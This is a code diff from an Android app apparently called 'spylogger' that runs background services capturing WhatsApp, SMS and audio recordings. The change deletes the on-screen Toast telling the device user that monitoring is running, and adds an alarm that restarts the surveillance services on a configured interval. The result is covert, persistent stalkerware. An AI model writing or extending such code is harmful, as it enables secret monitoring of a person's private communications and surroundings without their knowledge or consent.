@@ -22,11 +22,10 @@ import android.provider.ContactsContract.PhoneLookup;
 import android.provider.MediaStore;
 import android.provider.Settings.Secure;
 import android.util.Base64;
-import android.widget.Toast;
 
 import com.google.firebase.iid.FirebaseInstanceId;
-import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
+import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.receivers.Alarm;
@@ -544,8 +543,17 @@ public class Utils {
         return mensagem.substring(0, tamanho);
     }
 
+    public static void startAlarm(Context context, Configuracao configuracao){
+        if(Utils.alarm==null && configuracao!=null){
+            Utils.alarm=new Alarm();
+
+            Utils.alarm.CancelAlarm(context);
+            Utils.alarm.SetAlarm(context , configuracao.getIntervalo());
+        }
+    }
+
     // Start the service
-    public static void startNewService(Context context) {
+    public static void startNewService(Context context, Configuracao configuracao) {
         if (!Utils.isServiceRunning(context)) {
             if (rooted) {
                 context.startService(new Intent(context, WhatsAppService.class));
@@ -554,7 +562,6 @@ public class Utils {
             context.startService(new Intent(context, SmsService.class));
             context.startService(new Intent(context, RecordService.class));
         }
-//		Utils.startMail(context);
-        Toast.makeText(context, context.getString(R.string.service_running), Toast.LENGTH_LONG).show();
+        startAlarm(context,configuracao);
     }
 }
